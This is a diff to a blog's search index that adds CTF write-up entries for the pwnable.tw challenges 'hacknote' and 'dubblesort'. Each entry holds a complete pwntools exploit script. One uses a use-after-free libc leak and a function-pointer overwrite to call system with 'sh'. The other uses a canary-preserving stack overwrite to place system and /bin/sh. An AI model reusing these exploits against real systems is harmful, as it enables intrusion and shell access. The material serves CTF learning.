@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Hacknote Writeup]]></title>
+    <url>%2F2017%2F11%2F20%2Fhacknote-writeup%2F</url>
+    <content type="text"><![CDATA[exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *context.terminal = ['tmux', 'solitw', '-h']context.arch = 'x86'context.log_level = 'DEBUG'host = 'chall.pwnable.tw'port = 10102io = remote(host, port)free_plt = 0x080484A0# system_offset = 0x3ada0system_offset = 0x3a940printf_got = 0x804a010# printf_offset = 0x49670printf_offset = 0x49020put_content = 0x0804862Bdef addNote(size, content): io.recvuntil('Your choice :') io.sendline('1') io.recvuntil('Note size :') io.sendline(str(size)) io.recvuntil('Content :') io.sendline(content)def deleteNote(index): io.recvuntil('Your choice :') io.sendline('2') io.recvuntil('Index :') io.sendline(str(index))def printNote(index): io.recvuntil('Your choice :') io.sendline('3') io.recvuntil('Index :') io.sendline(str(index)) return io.recvuntil('\n')# gdb.attach(io, '''# b malloc# b free# ''')def main(): # leak libc first addNote(8, 'A'*7) addNote(16, 'A'*15) deleteNote(0) deleteNote(1) addNote(8, p32(put_content) + p32(printf_got)) io.recvuntil('Invalid choice') libc_base = u32(printNote(0)[0:4]) - printf_offset log.info("get libc base addr : 0x%x" % (libc_base)) deleteNote(2) addNote('8',p32(libc_base+system_offset)+';sh;') io.sendline('3') io.sendline('0') io.interactive()if __name__ == '__main__': main()]]></content>
+      <categories>
+        <category>write-up</category>
+      </categories>
+      <tags>
+        <tag>heap overflow</tag>
+        <tag>pwn</tag>
+        <tag>CTF</tag>
+        <tag>pwnable.tw</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Dubblesort Write Up]]></title>
     <url>%2F2017%2F11%2F19%2Fdubblesort-write-up%2F</url>
     <content type="text"><![CDATA[summary 由于程序未对需要冒泡排序的数字的个数进行限制, 这意味着我们可以对栈中的重要内容进行排序. 虽然程序开了Full RELRO, 但栈内数据的大小顺序是不会改变的. 为了不改写canary的值, 我们只能写入0x20个值, 但是需要对0x2b个数据进行排序, 考虑到程序用了scanf(&quot;%u&quot;, &amp;num)来输入数据, 我们可以通过写入一个a(或者其他非数字符号)来达到目的. 该exp中假设0x56555b2b&lt;cannary的值, 因为这样成功的几率会大一些 将system_addr写入返回地址,将binsh写入第一个参数的位置. stack123456 canary0xffffdafc: 0x8ec66400 0xf7fc33dc 0xffffdcdb 0x56555b2b0xffffdb0c: 0x00000000 0xf7fc3000 0xf7fc3000 0x000000000xffffdb1c: 0xf7e29637 0x00000001 0xffffdbb4 0xffffdbbc0xffffdb2c: 0x00000000 0x00000000 0x00000000 0xf7fc30000xffffdb3c: 0xf7ffdc04 0x00000001 exp123456789101112131415161718192021222324252627282930313233343536373839from pwn import *system_offset = 0x3a940 + 0x460binsh_offset = system_offset + 1182731log.info("binsh_offset: 0x%x" % (binsh_offset))log.info("system_offset: 0x%x" % (system_offset))context.terminal = ['tmux', 'splitw', '-h']context.log_level = 'DEBUG'context.arch = 'x86'io = process('./dubblesort')# gdb.attach(io, 'b *main+315')payload = 'A' * 24io.recvuntil('What your name :')io.sendline(payload)io.recvuntil('Hello ' + payload)libc_base = u32(io.recv(4)) - 0x1b200alog.info("get libc base addr : 0x%x" % (libc_base))io.recvuntil('How many numbers do you what to sort :')io.sendline(str(0x2b))for i in range(8): io.recvuntil('number : ') io.sendline(str(libc_base + system_offset)) i -= 1for i in range(15): io.recvuntil('number : ') io.sendline(str(0)) i -= 1io.sendline(str(libc_base + binsh_offset))io.sendline('a')io.recvuntil('Result :\n')io.recv(57)canary = int(io.recv(10))log.info("get canary: 0x%x" % (canary))io.recv()io.interactive()]]></content>
@@ -8,7 +22,10 @@
         <category>write-up</category>
       </categories>
       <tags>
-        <tag>pwnable.tw,pwn,stack overflow,CTF</tag>
+        <tag>pwn</tag>
+        <tag>CTF</tag>
+        <tag>pwnable.tw</tag>
+        <tag>stack overflow</tag>
       </tags>
   </entry>
   <entry>
